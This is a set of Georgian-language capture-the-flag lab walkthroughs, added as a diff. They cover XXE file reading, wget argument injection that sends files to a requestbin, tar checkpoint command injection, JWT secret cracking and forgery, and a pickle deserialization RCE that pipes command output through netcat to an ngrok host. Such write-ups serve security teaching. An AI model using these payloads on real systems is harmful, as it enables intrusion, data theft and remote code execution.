@@ -1,0 +1,154 @@
+LAB: syntax-check
+1. გადავიდეთ მოცემულ http://35.242.216.162:30344 მისამართზე და ვნახოთ რა გვაქვს მოცემული. ჩავატაროთ მონაცემთა ბაზის ტესტი curl-ის დახმარებით, გავუშვათ ეს ბრძანება: 
+curl -D- -XGET 'http://35.242.216.162:30344/parse' --data test
+მთავარ გვერდზე განთავსებული Parse ღილაკი არ მუშაობს, რომელიც ვხედავთ, რომ დაყენებულია GET პარამეტრზე <foo></foo> რომელსაც გადავყავართ რაღაც შეცდომის გვერდზე. სისტემამ დაგვიწერა, რომ ეს XML სტრინგი არ არის კარგად დაწერილი.
+
+2. ვცადოთ Burp Suite-ს დახმარებით ამ მისამართზე შესვლა, დავაჭიროთ Parse ღილაკზე და ვნახოთ დაბრუნებული პასუხი.
+
+3. გადავიტანოთ Burp Suite-ში მიღებული GET Request-ი Repeater-ში. 
+
+4. ვცადოთ სისტემას შევაპაროთ ისეთი მავნე სკრიპტი, რომლის წაკითხვასაც ვერ შეძლებს, ამისთვის გამოგვადგება PHP Filter სკრიპტი:
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/flag'>
+]>
+<foo>
+&xxe;
+</foo>
+
+5. ვიცით, რომ ჩვენი flag იმყოფება /var/www/html/flag დირექტორიაში, ასე რომ გადავუგზავნოთ ეს სკრიპტი Request-ის სახით Repeater-იდან და ვნახოთ რას დაგვიბრუნებს.
+
+6. სისტემამ დაგვიბრუნა ასეთი სახის რაღაც მისამართი: Y3RmezAyYmQ0ODYyNzMwMjYzNjJlOGE2OTYxY2QzMzAzODEyMDczYzUwZmE3NTliNDIwYjFlN2ExMWEyYzNhYjAxMzB9Cg==
+
+7. ეს არის UTF8 ენკოდირებული ტექსტური კოდი, იმისთვის რომ ეს დაშიფრული კოდი განვშიფროთ საჭიროა დავაკოპიროთ და გადავიტანოთ Burp Suite-ში არსებულ Decoder-ში და დავაყენოთ დეკოდირება Base64-ით, რომელიც დაგვიბრუნებს ჩვენ CTF-ს: 
+ctf{02bd486273026362e8a6961cd3303812073c50fa759b420b1e7a11a2c3ab0130}
+
+LAB: downloader-v1
+1. გადავიდეთ http://35.242.216.162:30944 მისამართზე და ვნახოთ რა გვაქვს მოცემული, გვაქვს რაღაც URL-ის შესაყვანი ველი, მოდი შევიყვანოთ რაიმე სურათის მისამართი და დავაჭიროთ Submit-ს. 
+
+2. სისტემამ დაგვიბრუნა რაღაც პასუხი და გავხსნათ Page Source და ვნახოთ რა არის შიგნით. ვხედავთ, რომ სისტემა გადამისამართებას აკეთებს "flag.php" გვერდზე. თუ შევხედავთ wget -h შეგვიძლია --body-file-ს შემჩნევა, რომელსაც სისტემა ურთავს ჩვენ მიერ მითითებულ ფაილს.
+
+3. ამ ყველაფრით დავრწმუნდით, რომ რაც არ უნდა შევიყვანოთ URL ველში სისტემა ყველაფერს იღებს, ასე რომ ვცადოთ ახლა მავნე URL-ის შეყვანა, რომელსაც გადავამისამართებთ Requestbin-ზე და ვნახავთ დაბრუნებულ პასუხს.
+
+4. პირველრიგში გადავიდეთ Requestbin-ზე და დავაგენერიროთ ჩვენი მისამართი და შევიყვანოთ ასეთი სახის URL: https://eourlgwuwg3hcs9.m.pipedream.net/test.php --post-file '/var/www/html/flag.php'
+
+5. გადავიდეთ Requestbin-ზე და ვნახოთ დაბრუნებული პასუხი, ვხედავთ, რომ ჩვენი CTF იმყოფება body-ში: DCTF{6789af26f90396678909a99bf46ba3a78b2f1b349fbc4385e6c50556c1d0c9ff}
+
+LAB: tartarsausage
+1. გადავიდეთ მოცემულ მისამართზე http://34.141.25.94:31482 რომლის შემდეგაც ვხედავთ ასეთ რაღაცას, ფაილის ასატვირთ ველსა და Submit ღილაკს, თუ შევალთ Page Source-ში და კარგად შევხედავთ დავინახავთ, რომ body-ში იმყოფება რაღაც დამალული html გვერდი: sadjwjaskdkwkasjdkwasdasdas.html
+
+2. მივუწეროთ ეს ჩვენ მისამართს და გადავიდეთ დამალულ გვერდზე. ვხედავთ დამალულ გვერდს, რომელზეც არის რაღაც შესაყვანი ველი და გვეუბნება, რომ ვცადოთ რაიმე Shell ბრძანებების შეყვანა. როგორც მინიშნებიდან ვკითხულობთ ნახსენებია tar და დამალულ გვერდზე კი Shell ბრძანებების შესახებ. PHP სკრიპტი, რომელიც მონაცემებს ამუშავებს აძლევს შესაყვან სტრინგს, როგორც არგუმენტი tar-ს PHP escapeshellcmd ფუნქციის დახმარებით. როგორც ვხვდებით ესეთი სახის შეცდომა გვეუბნება, რომ შეგვიძლია გავაგზავნოთ ბრძანებები, რომელსაც სისტემა ვერ გაუშვებს.
+
+3. ვცადოთ შესაყვან ველში ამ სკრიპტის გაშვება: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+ვხედავთ პასუხს: "If you don't see my flag. Try harder :D!!" 
+როგორც ვხედავთ escapeshellcmd ხელს არ უშლის ბრძანებების შეყვანას.
+
+4. ახლა შევიყვანოთ სკრიპტი, რომელიც დაგვეხმარება იმ საქაღალდის პოვნაში, რომელშიც flag-ის პოვნაა შესაძლებელი: -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="ls -lah"
+გადავიდეთ Page Source-ში და ვნახოთ დაბრუნებული პასუხი. ვხედავთ დირექტორიას ძალიან გრძელი სახელით flag-ს, რომელიც შეიცავს ჩვენ flag-ს: enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz
+
+5. ახლა გავუშვათ curl და შევიყვანოთ ამ გვერდის მისამართი და მივუწეროთ /enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/flag
+გავუშვათ: curl http://34.141.25.94:31482/enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/flag
+
+6. მივიღეთ ჩვენი CTF: ctf{e15918e70b7c3395bcb357b4ca5e95f868ebc462d33371a5f44a25c35f8faa45}
+
+LAB: under-construction
+1. დავრეგისტრირდეთ და გავიაროთ ავტორიზაცია მოცემულ http://34.141.121.244:32534 მისამართზე გადასვლის შემდეგ
+
+2. გადავიდეთ User გვერდზე და გავხსნათ Inspect Element. შემდეგ გადავიდეთ Application-ში, შემდეგ მოვძებნოთ და ჩამოვშალოთ Local Storage და დავაჭიროთ. ვხედავთ, რომ გვაქვს Key=user და Value={"id":18,"username":"testname","email":"testmail@gmail.com","roles":["USER"],"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTgsImlhdCI6MTY1NjQ0ODYxMiwiZXhwIjoxNjU2NTM1MDEyfQ.vhMHHSALef4zJR_eKE0IJeI8CO_f3GeLAifEL_75O0A"}
+
+3. გადავიდეთ ახლა Inspect Element-ის Source განყოფილებაში და ვნახოთ js საქაღალდე და ჩამოვშალოთ, რომელშიც გვაქვს რაღაც ფაილი სახელად app.d875ddd5.js. გავხსნათ ეს ფაილი ახალ ფანჯარაში და ვნახოთ. 
+
+4. გვაქვს რაღაც დიდი კოდი, რომელშიც საჭიროა ვიპოვნოთ ჩვენი Admin-ის როლი, მარტივად დავაჭიროთ crtl+f და ჩავწეროთ სიტყვა ROLE. ვხედავთ, რომ გვაქვს ROLE_ADMIN, რომლითაც უნდა შევცვალოთ user-ი.
+
+5. გადავიდეთ ისევ უკან Inspect Element-ის განყოფილება Application-ში და Value-ში არსებული მისამართი შევცვალოთ. id დავაყენოთ 1-ზე, რადგან ადმინია, შემდეგ USER-ის ნაცვლად შევიყვანოთ ROLE_ADMIN დავაჭიროთ enter-ს და დავარეფრეშოთ გვერდი.
+
+6. ვხედავთ, რომ გამოჩნდა გვერდი სახელად Admin Board, გადავიდეთ ამ გვერდზე და ვნახოთ Inspect Element. გადავიდეთ Application-ში და Value-ში არსებული Token უნდა შევცვალოთ ჩვენი გენერირებული, ხელმოწერილი Token-ით, რომლისთვისაც გამოგვადგება jwt.io ვებ-საიტი. დავაკოპიროთ ჩვენი TOKEN, რომელიც არის Value-ში და გადავიტანოთ jwt.io-ში.
+
+7. ახლა საჭიროა შევცვალოთ id=1-ად და ქვევით საჭიროა ხელის მოწერა, ამისთვის საჭიროა გავარკვიოთ ადმინის ხელმოწერის პაროლი, რომლის მოძებნაშიც დაგვეხმარება პაროლების სია rockyou, რომელიც გვაქვს Kali-ში.
+
+8. Python-ში გავუშვათ ეს სკრიპტი, რომელიც იპოვნის ჩვენი Token-ისთვის ხელმოსაწერ პაროლს, რომელიც ჩაწერილია rockyou.txt ფაილში.
+python3 jwt_tool.py –t http://34.141.121.244:32534/api/app/admin -rc “ჩვენი ტოკენი“ -C -d rockyou.txt
+
+9. გავარკვიეთ ხელმოსაწერი პაროლი არის letmein, შევიყავნოთ ეს პაროლი jwt.io-ში და დავაკოპიროთ ჩვენი მიღებული ხელმოწერილი Token, შემდეგ შევცვალოთ ძველი Token, რომელიც არის Value-ში, დავაჭიროთ Enter-ს და დავარეფრეშოთ, ხელახლა გადავიდეთ Admin Board-ში სადაც წერია უკვე ჩვენი CTF: CTF{b566bdee4836bbb0bdfb9aff931d7f061b67db0e9cf3859f246261d0acc35438}
+
+სკრიპტით ამოხსნა
+1. შევქმნათ python-ის ფაილი და შევიყვანოთ ეს სკრიპტი:
+
+import requests
+import jwt
+
+url = "http://34.141.121.244:32534/api/app/admin"
+
+payload = {"id":1, "iat":1608020118, "exp":1609106518}
+token = jwt.encode(payload, "letmein", algorithm='HS256')
+
+print(token)
+r = requests.get(url, headers={"x-access-token": token})
+
+print(r.text)
+
+ჩვენი მიღებული პასუხი არის pickle-ით ენკოდირებული ობიექტი
+
+2. შემდეგ გავუშვათ python და გავუშვათ შემდეგი ბრძანება: python solve.py 
+b'ჩვენ მიერ დაგენერირებული, ხელმოწერილი ტოკენი'
+
+LAB: alfa-cookie
+1. python3 -m pip install --upgrade pwntools 
+
+2. რადგანაც Pickle დაუცველია RCE-ს მიმართ, ჩვენ შევცვალეთ user>admin-ად და გავუშვით ჩვენი კოდი
+
+Python3
+from pwn import xor
+bytes.fromhex('აქ ჩავსვათ auth_cookie')
+key = ‘აქ ჩავსვათ ჩვენი key’
+xor(_,key)
+show=წინა ბრძანების პასუხში user ვცვლით adminით show=b"(dp0\nS'permission'\np1\nS'user'\np2\ns."
+xor(show,key)
+b"o%C\t:\x06\x17?30.<%)+)'i;8sY\nuR67=+v<$\x0bCEi".hex() მიღებულ პასუხს დამატებული .hex()
+
+3. ngrok tcp 5555
+nc -nvlp 5555
+
+4. Python ფაილში
+
+import requests
+import pickle
+from pwn import * 
+
+url = "http: 34.141.121.244:31606/dashboard"
+
+class RCE:
+def __reduce__(self):
+cmd = ('ls -lah | nc 6.tcp.ngrok.io 11337')
+return os.system, (cmd,)
+
+payload = pickle.dumps(RCE(), protocol=2)
+print(payload)
+key = len(payload) * "A"
+auth_cookie = xor(payload, key).hex()
+
+r = requests.get(url, cookies={"key":key,"auth_cookie": auth_cookie})
+
+5. გავუშვათ: python3 alfa-cookie.py და მოვუსმინოთ ngrok-ით
+დაგვიბრუნა დირექტორიები, გვჭირდება flag დირექტორია
+
+6. Python ის კოდი ოღონდ ls -lah ჩავანაცვლეთ cat flag-ით.
+import requests
+import pickle
+from pwn import * 
+
+url = "http: 34.141.121.244:31606/dashboard"
+
+class RCE:
+def __reduce__(self):
+cmd = ('cat flag | nc 6.tcp.ngrok.io 11337')
+return os.system, (cmd,)
+
+payload = pickle.dumps(RCE(), protocol=2)
+print(payload)
+key = len(payload) * "A"
+auth_cookie = xor(payload, key).hex()
+
+r = requests.get(url, cookies={"key":key,"auth_cookie": auth_cookie})
